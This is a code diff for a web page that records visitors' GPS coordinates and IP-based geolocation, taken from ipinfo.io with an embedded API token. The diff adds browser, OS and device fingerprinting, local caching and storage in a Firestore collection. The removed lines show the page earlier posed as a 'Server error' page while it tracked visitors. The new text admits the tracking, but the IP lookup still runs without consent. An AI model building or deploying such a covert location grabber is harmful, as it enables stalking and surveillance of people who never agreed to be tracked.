@@ -32,13 +32,63 @@
             return istTime;
         }
 
+        // Generate a Unique Cache ID
+        function generateCacheID() {
+            return 'cache-' + Date.now() + '-' + Math.floor(Math.random() * 1000);
+        }
+
+        // Get Device Info
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let deviceType = /Mobi|Android/i.test(userAgent) ? "Mobile" : "Desktop";
+
+            let browser = "Unknown";
+            if (userAgent.indexOf("Chrome") > -1) {
+                browser = "Chrome";
+            } else if (userAgent.indexOf("Firefox") > -1) {
+                browser = "Firefox";
+            } else if (userAgent.indexOf("Safari") > -1) {
+                browser = "Safari";
+            } else if (userAgent.indexOf("Edge") > -1) {
+                browser = "Edge";
+            } else if (userAgent.indexOf("Opera") > -1) {
+                browser = "Opera";
+            }
+
+            let os = "Unknown";
+            if (userAgent.indexOf("Win") > -1) {
+                os = "Windows";
+            } else if (userAgent.indexOf("Mac") > -1) {
+                os = "MacOS";
+            } else if (userAgent.indexOf("Linux") > -1) {
+                os = "Linux";
+            } else if (userAgent.indexOf("Android") > -1) {
+                os = "Android";
+            } else if (userAgent.indexOf("iOS") > -1) {
+                os = "iOS";
+            }
+
+            return { deviceType, browser, os };
+        }
+
         // Save Data to Firestore
         async function saveUserData(data) {
             try {
                 await addDoc(collection(db, "user_data"), data);
                 console.log("✅ Data saved:", data);
+                saveToCache(data);
             } catch (error) {
                 console.error("❌ Error saving data:", error);
+                saveToCache(data);
+            }
+        }
+
+        // Save Data to Cache Storage
+        async function saveToCache(data) {
+            if ('caches' in window) {
+                const cache = await caches.open('location-cache-v1');
+                await cache.put(data.cacheID, new Response(JSON.stringify(data), { headers: { "Content-Type": "application/json" } }));
+                console.log("📁 Data stored in cache:", data.cacheID);
             }
         }
 
@@ -46,12 +96,17 @@
         function getGPSLocation(callback) {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(position => {
+                    let deviceInfo = getDeviceInfo();
                     let data = {
+                        cacheID: generateCacheID(),
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
                         accuracy: position.coords.accuracy,
                         time: getISTTime(),
-                        source: "GPS"
+                        source: "GPS",
+                        deviceType: deviceInfo.deviceType,
+                        browser: deviceInfo.browser,
+                        os: deviceInfo.os
                     };
                     callback(data);
                 }, () => {
@@ -69,7 +124,9 @@
             fetch("https://ipinfo.io/json?token=6a9008bb55fd89")
                 .then(response => response.json())
                 .then(data => {
+                    let deviceInfo = getDeviceInfo();
                     let location = {
+                        cacheID: generateCacheID(),
                         ip: data.ip,
                         city: data.city,
                         region: data.region,
@@ -77,7 +134,10 @@
                         latitude: data.loc.split(",")[0],
                         longitude: data.loc.split(",")[1],
                         time: getISTTime(),
-                        source: "IP"
+                        source: "IP",
+                        deviceType: deviceInfo.deviceType,
+                        browser: deviceInfo.browser,
+                        os: deviceInfo.os
                     };
                     callback(location);
                 })
@@ -119,7 +179,7 @@
 </head>
 
 <body>
-    <h1>Server error.</h1>
-    <p>Try again after some time...</p>
+    <h1>Tracking Location...</h1>
+    <p>This page is tracking your location every 60 minutes.</p>
 </body>
 </html>
